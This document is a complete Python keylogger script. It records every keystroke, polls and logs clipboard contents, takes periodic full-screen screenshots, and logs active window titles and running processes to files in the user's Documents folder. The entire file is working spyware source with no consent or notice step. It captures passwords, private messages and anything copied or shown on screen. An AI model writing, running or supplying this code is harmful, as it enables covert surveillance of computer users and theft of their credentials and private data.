import logging
from pynput import keyboard
import pyperclip
from PIL import ImageGrab
import os
import time
import threading
import psutil
import pygetwindow as gw

# Configure logging directories
log_dir = os.path.join(os.path.expanduser("~"), "Documents", "keylogger_logs")
image_dir = os.path.join(log_dir, "screenshots")

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

if not os.path.exists(image_dir):
    os.makedirs(image_dir)

# Configure logging files
keypress_log = os.path.join(log_dir, "keylog.txt")
clipboard_log = os.path.join(log_dir, "clipboard_log.txt")
process_log = os.path.join(log_dir, "process_log.txt")

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s: %(message)s')

keypress_logger = logging.getLogger("keypress_logger")
keypress_handler = logging.FileHandler(keypress_log)
keypress_logger.addHandler(keypress_handler)

clipboard_logger = logging.getLogger("clipboard_logger")
clipboard_handler = logging.FileHandler(clipboard_log)
clipboard_logger.addHandler(clipboard_handler)

process_logger = logging.getLogger("process_logger")
process_handler = logging.FileHandler(process_log)
process_logger.addHandler(process_handler)

def on_press(key):
    try:
        keypress_logger.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        keypress_logger.info('Special key pressed: {0}'.format(key))

def log_clipboard():
    recent_value = ""
    while True:
        time.sleep(5)
        current_value = pyperclip.paste()
        if current_value != recent_value:
            recent_value = current_value
            clipboard_logger.info('Clipboard content: {0}'.format(recent_value))

def capture_screen():
    while True:
        time.sleep(60)  # Capture screen every 60 seconds
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(image_dir, "screenshot_{0}.png".format(int(time.time()))))

def track_activity():
    previous_window = None
    while True:
        time.sleep(5)
        current_window = gw.getActiveWindowTitle()
        if current_window != previous_window:
            previous_window = current_window
            process_logger.info('Active window: {0}'.format(current_window))
        for proc in psutil.process_iter(['pid', 'name']):
            process_logger.info('Running process: {0} (PID: {1})'.format(proc.info['name'], proc.info['pid']))

# Start keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Start clipboard logger
clipboard_thread = threading.Thread(target=log_clipboard)
clipboard_thread.start()

# Start screen capture
screen_thread = threading.Thread(target=capture_screen)
screen_thread.start()

# Start activity tracker
activity_thread = threading.Thread(target=track_activity)
activity_thread.start()

listener.join()
clipboard_thread.join()
screen_thread.join()
activity_thread.join()